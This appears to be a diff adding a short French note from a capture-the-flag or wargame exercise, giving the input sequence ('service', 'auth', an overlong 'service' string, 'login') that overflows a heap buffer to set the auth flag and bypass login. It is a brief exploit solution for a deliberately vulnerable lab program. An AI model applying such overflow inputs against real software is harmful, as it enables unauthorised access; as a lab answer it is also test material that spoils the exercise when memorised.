@@ -1,0 +1,6 @@
+le programme est très fragile. il suffit d'appeller la sequence suivante
+service 1
+auth 1
+service 1234678901234567890123456789012345678901234567890
+(string suffisament long pour overflow le caractère 0x20 de auth)
+login
